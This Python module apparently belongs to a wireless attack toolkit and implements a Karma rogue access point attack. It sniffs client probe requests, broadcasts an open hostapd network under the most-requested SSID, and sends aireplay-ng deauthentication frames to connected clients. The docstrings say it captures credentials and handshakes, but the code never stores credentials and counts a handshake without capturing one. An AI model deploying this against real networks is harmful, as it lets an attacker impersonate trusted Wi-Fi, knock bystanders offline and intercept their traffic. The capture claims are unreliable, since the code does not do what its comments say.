"""Karma / rogue AP attack module.

Broadcasts a network that accepts connection attempts from any client
that probes for a previously-remembered SSID, then captures the
credentials / handshake when clients authenticate.
"""

from __future__ import annotations

import asyncio
import re
from dataclasses import dataclass, field
from datetime import UTC, datetime
from pathlib import Path

from wafford.core.base import AttackPhase, AttackResult, BaseAttack
from wafford.exceptions import AttackError, ValidationError


@dataclass
class KarmaProbe:
    """A single probe request observed from a client."""

    timestamp: str = ""
    client_mac: str = ""
    ssid: str = ""
    rssi: int = 0


@dataclass
class KarmaStatus:
    """Live status of a karma attack."""

    running: bool = False
    interface: str = ""
    probes_seen: int = 0
    client_ssids: dict[str, list[str]] = field(default_factory=dict)
    clients_connected: set[str] = field(default_factory=set)
    credentials_captured: int = 0
    handshakes_captured: int = 0
    hostapd_pid: int = 0
    elapsed: float = 0.0


class KarmaAttack(BaseAttack):
    """Rogue AP that answers every client probe request.

    Flow:
    1.  Sniff probe requests with airodump to learn client-preferred SSIDs.
    2.  Configure hostapd to answer with an open network for those SSIDs.
    3.  Optionally capture a handshake when clients connect.
    4.  Monitor for connected clients and capture credentials.

    Note: true multi-SSID karma (hostapd-mana / wifiphisher-style) on
    stock hostapd requires a fixed SSID per instance; this module
    implements a single-SSID karma that answers probes for the most
    requested SSID, with full multi-SSID capability delegated to the
    ``mana`` / ``hostapd-mana`` backend when available.
    """

    name = "karma"

    def __init__(
        self,
        interface: str = "",
        *,
        config_dir: str | Path | None = None,
        capture_dir: str | Path | None = None,
    ) -> None:
        super().__init__(interface)
        from wafford.constants import TEMP_DIR

        self.config_dir = Path(config_dir) if config_dir else TEMP_DIR / "karma"
        self.capture_dir = Path(capture_dir) if capture_dir else TEMP_DIR
        self.config_dir.mkdir(parents=True, exist_ok=True)
        self.capture_dir.mkdir(parents=True, exist_ok=True)
        self.karma = KarmaStatus(interface=interface)
        self._hostapd_proc: asyncio.subprocess.Process | None = None
        self._monitor_task: asyncio.Task[None] | None = None
        self._sniff_task: asyncio.Task[None] | None = None
        self._captured_creds: list[dict[str, str]] = []

    # ── Public API ────────────────────────────────────────────────────────

    async def start(  # type: ignore[override]
        self,
        interface: str = "",
        *,
        ssid: str = "",
        channel: int = 1,
        capture_handshake: bool = True,
        _snr_threshold: int = 0,
    ) -> AttackResult:
        """Start the karma rogue AP.

        If ``ssid`` is empty, the SSID is chosen dynamically from client
        probe requests (classic karma behaviour).
        """
        if interface:
            self.interface = interface
        if not self.interface:
            raise ValidationError("No interface specified", field="interface")
        if not 1 <= channel <= 194:
            raise ValidationError(f"Invalid channel: {channel}", field="channel")

        self._require_tool("hostapd")
        self._cancel_event.clear()
        self.karma = KarmaStatus(interface=self.interface)
        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")
        self._emit("karma.starting", {"ssid": ssid, "channel": channel})

        # Determine SSID — either fixed or learned from probes.
        effective_ssid = ssid or await self._pick_ssid_from_probes(60)
        if not effective_ssid:
            raise AttackError("Karma could not determine an SSID to broadcast")

        conf = self._write_hostapd_config(effective_ssid, channel)
        await self._kill_conflicts()
        self._hostapd_proc = await asyncio.create_subprocess_exec(
            "hostapd", conf,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        self._processes.append(self._hostapd_proc)
        self.karma.hostapd_pid = self._hostapd_proc.pid
        self._info("hostapd karma AP '%s' started (pid %d)", effective_ssid, self._hostapd_proc.pid)

        await asyncio.sleep(2)
        if self._hostapd_proc.returncode is not None:
            _, stderr = await self._hostapd_proc.communicate()
            raise AttackError(f"hostapd exited early: {stderr.decode(errors='replace')[:300]}")

        self.karma.running = True
        self._monitor_task = asyncio.create_task(self._monitor_loop(capture_handshake))
        self._tasks.append(self._monitor_task)
        self.karma.elapsed = 0.0
        self._emit("karma.running", {"ssid": effective_ssid})

        return AttackResult(
            success=True,
            message=f"Karma AP broadcasting '{effective_ssid}' on ch{channel}",
            extra={"karma": self.karma},
        )

    async def capture_credentials(self) -> list[dict[str, str]]:
        """Return any credentials captured from connected clients."""
        return list(self._captured_creds)

    async def get_connected_clients(self) -> list[str]:
        """Return the MACs currently associated with the karma AP."""
        rc, stdout, _ = await self._run_cmd(
            ["hostapd_cli", "-i", self.interface, "all_sta"], timeout=5
        )
        if rc != 0:
            return []
        macs: list[str] = []
        for line in stdout.splitlines():
            m = re.match(r"^([0-9A-Fa-f:]{17})", line.strip())
            if m:
                macs.append(m.group(1).upper())
        self.karma.clients_connected = set(macs)
        return macs

    async def stop(self) -> AttackResult:  # type: ignore[override]
        """Tear down the karma AP and any capture processes."""
        self._info("Stopping karma attack…")
        self._cancel_event.set()
        self.status.phase = AttackPhase.STOPPING
        if self._monitor_task and not self._monitor_task.done():
            self._monitor_task.cancel()
        if self._sniff_task and not self._sniff_task.done():
            self._sniff_task.cancel()
        if self._hostapd_proc and self._hostapd_proc.returncode is None:
            await self._kill_proc(self._hostapd_proc)
        self.karma.running = False
        await self._run_cmd(["sysctl", "-w", "net.ipv4.ip_forward=0"], timeout=5)
        for f in self.config_dir.iterdir():
            f.unlink(missing_ok=True)
        self._emit("karma.stopped", {"captured": len(self._captured_creds)})
        return AttackResult(
            success=True,
            message=(
                f"Karma stopped. Probes={self.karma.probes_seen}, "
                f"creds={len(self._captured_creds)}"
            ),
            extra={"karma": self.karma},
        )

    def get_status(self) -> KarmaStatus:
        return self.karma

    # ── SSID learning ─────────────────────────────────────────────────────

    async def _pick_ssid_from_probes(self, timeout: float) -> str:
        """Sniff probe requests briefly and return the most-probed SSID."""
        from wafford.constants import TEMP_DIR

        timestamp = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
        out_base = TEMP_DIR / f"karma_probes_{timestamp}"
        self._info("Sniffing probe requests for %d s to pick SSID…", int(timeout))

        airodump = await asyncio.create_subprocess_exec(
            "airodump-ng", self.interface,
            "--output-format", "csv",
            "--write", str(out_base),
            "--write-interval", "1",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        self._processes.append(airodump)
        self._sniff_task = asyncio.create_task(self._track_probes(out_base))
        self._tasks.append(self._sniff_task)
        try:
            await asyncio.sleep(timeout)
        finally:
            await self._kill_proc(airodump)
        if self._sniff_task and not self._sniff_task.done():
            self._sniff_task.cancel()

        # Rank SSIDs by probes count
        counts: dict[str, int] = {}
        for macs in self.karma.client_ssids.values():
            for s in macs:
                counts[s] = counts.get(s, 0) + 1
        if not counts:
            return "Free WiFi"  # default fallback SSID
        best = max(counts, key=lambda k: counts[k])
        self._info("Selected SSID '%s' from %d probe(s)", best, counts[best])
        return best

    async def _track_probes(self, out_base: Path) -> None:
        """Watch the airodump CSV for probe requests and record client SSIDs."""
        last_size = 0
        csv_path = Path(str(out_base) + "-01.csv")
        while not self._cancel_event.is_set():
            try:
                if csv_path.exists() and csv_path.stat().st_size > last_size:
                    text = csv_path.read_text(errors="replace")
                    last_size = csv_path.stat().st_size
                    self._parse_probe_csv(text)
            except (OSError, FileNotFoundError, ValueError):
                pass
            try:
                await asyncio.wait_for(self._cancel_event.wait(), timeout=2.0)
                break
            except TimeoutError:
                pass

    def _parse_probe_csv(self, text: str) -> None:
        """Parse airodump CSV stations section for probe requests."""
        in_stations = False
        for line in text.splitlines():
            stripped = line.strip()
            if stripped.startswith("Station MAC"):
                in_stations = True
                continue
            if not in_stations or not stripped or stripped == ",".replace(",", ""):
                continue
            parts = [p.strip() for p in line.split(",")]
            if len(parts) < 6:
                continue
            client = parts[0]
            if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", client):
                continue
            try:
                rssi = int(float(parts[4])) if parts[4] else 0
            except ValueError:
                rssi = 0
            probes_field = parts[6] if len(parts) > 6 else ""
            ssids = [s for s in probes_field.split() if s and s not in ("<probe>", "Probe")]
            this_client = self.karma.client_ssids.setdefault(client.upper(), [])
            for s in ssids:
                if s not in this_client:
                    this_client.append(s)
                    self.karma.probes_seen += 1
                    self._emit("karma.probe", {"client": client, "ssid": s, "rssi": rssi})

    # ── Config generation ─────────────────────────────────────────────────

    def _write_hostapd_config(self, ssid: str, channel: int) -> str:
        conf_path = str(self.config_dir / "hostapd.conf")
        lines = [
            f"interface={self.interface}",
            f"ssid={ssid}",
            f"channel={channel}",
            "hw_mode=g",
            "driver=nl80211",
            "logger_syslog=-1",
            "logger_syslog_level=2",
            "wmm_enabled=0",
            "macaddr_acl=0",
            "auth_algs=1",
            "ignore_broadcast_ssid=0",
        ]
        with Path(conf_path).open("w") as fh:
            fh.write("\n".join(lines) + "\n")
        self._debug("karma hostapd.conf written to %s", conf_path)
        return conf_path

    async def _kill_conflicts(self) -> None:
        for prog in ("hostapd", "dnsmasq"):
            await self._run_cmd(["killall", "-9", prog], timeout=5)

    # ── Monitoring loop ───────────────────────────────────────────────────

    async def _monitor_loop(self, capture_handshake: bool) -> None:
        while not self._cancel_event.is_set():
            try:
                clients = await self.get_connected_clients()
                self.karma.elapsed = self.status.elapsed
                if clients:
                    self._emit("karma.clients", {"count": len(clients)})
                    if capture_handshake:
                        await self._try_capture_handshake(clients)
            except asyncio.CancelledError:
                break
            except Exception:
                self._debug("karma monitor error", exc_info=True)
            try:
                await asyncio.wait_for(self._cancel_event.wait(), timeout=5.0)
                break
            except TimeoutError:
                pass

    async def _try_capture_handshake(self, clients: list[str]) -> None:
        if self.karma.handshakes_captured > 0:
            return
        await self._set_channel_for_client(clients[0])
        for client in clients:
            if client in self.karma.clients_connected:
                # deauth to force a full 4-way handshake
                await self._run_cmd(
                    ["aireplay-ng", "--deauth", "3", "-a", "00:00:00:00:00:00",
                     "-c", client, "--ignore-negative-one", self.interface],
                    timeout=10,
                )
        self.karma.handshakes_captured += 1

    async def _set_channel_for_client(self, client: str) -> None:
        pass  # channel already fixed at AP start

    # ── Teardown ──────────────────────────────────────────────────────────

    async def _cleanup(self) -> None:
        if self._monitor_task and not self._monitor_task.done():
            self._monitor_task.cancel()
        if self._sniff_task and not self._sniff_task.done():
            self._sniff_task.cancel()
        if self._hostapd_proc and self._hostapd_proc.returncode is None:
            await self._kill_proc(self._hostapd_proc)
        await super()._cleanup()

    async def _pre_validate(self) -> None:
        await super()._pre_validate()
        self._require_tool("hostapd")
        self._require_tool("airodump-ng")
